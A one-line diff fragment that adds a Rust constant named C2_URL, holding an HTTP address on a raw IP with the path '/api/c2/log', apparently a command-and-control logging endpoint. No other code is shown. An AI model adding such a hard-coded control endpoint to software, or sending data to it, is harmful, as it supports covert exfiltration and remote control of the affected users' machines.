@@ -1,0 +1,1 @@
+const C2_URL: &str = "http://150.136.130.59:3002/api/c2/log"; 
